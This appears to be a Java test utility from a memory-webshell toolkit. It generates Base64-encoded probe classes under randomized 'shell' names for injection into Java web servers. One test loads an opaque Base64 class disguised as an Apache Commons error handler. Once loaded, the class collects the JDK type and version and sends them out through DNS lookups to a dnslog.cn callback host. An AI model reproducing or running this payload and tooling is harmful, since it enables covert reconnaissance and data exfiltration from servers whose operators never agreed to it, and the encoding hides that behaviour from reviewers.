package com.reajason.javaweb.integration.probe;

import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.utils.CommonUtil;
import com.reajason.javaweb.probe.payload.BasicInfoPrinter;
import com.reajason.javaweb.probe.payload.JdkProbe;
import com.reajason.javaweb.probe.payload.ServerProbe;
import com.reajason.javaweb.util.ClassDefiner;
import net.bytebuddy.ByteBuddy;
import org.apache.commons.codec.binary.Base64;
import org.junit.jupiter.api.Test;

/**
 * @author ReaJason
 * @since 2025/7/28
 */
public class DetectionTool {

    public static String getBase64Class(Class<?> clazz) {
        return Base64.encodeBase64String(new ByteBuddy()
                .redefine(clazz)
                .name(CommonUtil.generateShellClassName())
                .visit(TargetJreVersionVisitorWrapper.DEFAULT)
                .make().getBytes());
    }

    public static String getJdkDetection() {
        return getBase64Class(JdkProbe.class);
    }

    public static String getBasicInfoPrinter() {
        return getBase64Class(BasicInfoPrinter.class);
    }

    public static String getServerDetection() {
        return getBase64Class(ServerProbe.class);
    }

    @Test
    void test() {
        System.out.println(getServerDetection());
    }

    @Test
    void testBase() {
        byte[] bytes = Base64.decodeBase64("yv66vgAAADIAeQEAJW9yZy9hcGFjaGUvY29tbW9ucy9EcExrTC9FcnJvckhhbmRsZXIHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAEaG9zdAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAEG01OTV6Yi5kbnNsb2cuY24IAAcBAAY8aW5pdD4BAAMoKVYBABNqYXZhL2xhbmcvVGhyb3dhYmxlBwALDAAJAAoKAAQADQEABmdldEpkawEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DAAPABAKAAIAEQEAAlx8CAATAQAQamF2YS9sYW5nL1N0cmluZwcAFQEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7DAAXABgKABYAGQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyBwAbCgAcAA0BAAhqZGtUeXBlLggAHgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwwAIAAhCgAcACIBAAh0b1N0cmluZwwAJAAQCgAcACUBAAxqYXZhVmVyc2lvbi4IACcBABFjbGFzc0ZpbGVWZXJzaW9uLggAKQEAE1tMamF2YS9sYW5nL1N0cmluZzsHACsBAAEuCAAtDAAFAAYJAAIALwEAFGphdmEvbmV0L0luZXRBZGRyZXNzBwAxAQAMZ2V0QWxsQnlOYW1lAQArKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbmV0L0luZXRBZGRyZXNzOwwAMwA0CgAyADUBAAlqYXZhLmhvbWUIADcBABBqYXZhL2xhbmcvU3lzdGVtBwA5AQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwwAOwA8CgA6AD0BAAxqYXZhL2lvL0ZpbGUHAD8BAA1zZXBhcmF0b3JDaGFyAQABQwwAQQBCCQBAAEMBAAlqYXZhYy5leGUIAEUBAAVqYXZhYwgARwEAA2JpbggASQEACXNlcGFyYXRvcgwASwAGCQBAAEwBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KVYMAAkATgoAQABPAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAJAFEKAEAAUgEADWdldFBhcmVudEZpbGUBABAoKUxqYXZhL2lvL0ZpbGU7DABUAFUKAEAAVgEAIyhMamF2YS9pby9GaWxlO0xqYXZhL2xhbmcvU3RyaW5nOylWDAAJAFgKAEAAWQEABmV4aXN0cwEAAygpWgwAWwBcCgBAAF0BAANKREsIAF8BAANKUkUIAGEBAAxqYXZhLnZlcnNpb24IAGMBABBqYXZhL2xhbmcvRG91YmxlBwBlAQASamF2YS5jbGFzcy52ZXJzaW9uCABnCgBmAFIBAAhpbnRWYWx1ZQEAAygpSQwAagBrCgBmAGwBAAd2YWx1ZU9mAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7DABuAG8KABYAcAEAAXwIAHIBAAg8Y2xpbml0PgoAAgANAQANQ29uc3RhbnRWYWx1ZQEABENvZGUBAA1TdGFja01hcFRhYmxlACEAAgAEAAAAAQAJAAUABgABAHYAAAACAAgAAwABAAkACgABAHcAAADtAAYACAAAAJsqtwAOKrcAEhIUtgAaTAa9ABZZA7sAHFm3AB0SH7YAIysDMrYAI7YAJlNZBLsAHFm3AB0SKLYAIysEMrYAI7YAJlNZBbsAHFm3AB0SKrYAIysFMrYAI7YAJlNNLE4tvjYEAzYFFQUVBKIAMi0VBTI6BrsAHFm3AB0ZBrYAIxIutgAjsgAwtgAjtgAmuAA2V6cABToHhAUBp//NsQABAHEAjwCSAAwAAQB4AAAAOAAE/wBkAAYHAAIHACwHACwHACwBAQAA/wAtAAcHAAIHACwHACwHACwBAQcAFgABBwAM+gAB+AAFAAIADwAQAAEAdwAAATcABQAKAAAA0gFMKk0AAacAA00SOLgAPk6yAEQQXKAACBJGpwAFEkg6BLsAQFktuwAcWbcAHRJKtgAjsgBNtgAjGQS2ACO2ACa3AFA6BbsAQFm7AEBZLbcAU7YAV7sAHFm3AB0SSrYAI7IATbYAIxkEtgAjtgAmtwBaOgYZBbYAXpoACxkGtgBemQAIEmCnAAUSYjoHEmS4AD46CLsAZlkSaLgAPrcAabYAbbgAcToJuwAcWbcAHRkHtgAjEnO2ACMZCLYAIxJztgAjGQm2ACO2ACZZTacAA0wssAAAAAEAeAAAAFMAC/wAAgcAFvwAAQcAAv8ABAACBwACBwAWAAEHABb8AAAHABb8ABIHABZBBwAW/gBjBwAWBwBABwBABEEHABb/AEQAAwcAAgcAFgcAFgABBwAWAAAIAHQACgABAHcAAAAnAAIAAAAAABGnAA0AuwACWbcAdVexAKf/9QAAAAEAeAAAAAQAAgMJAAA=");
        ClassDefiner.defineClass(bytes);
    }
}
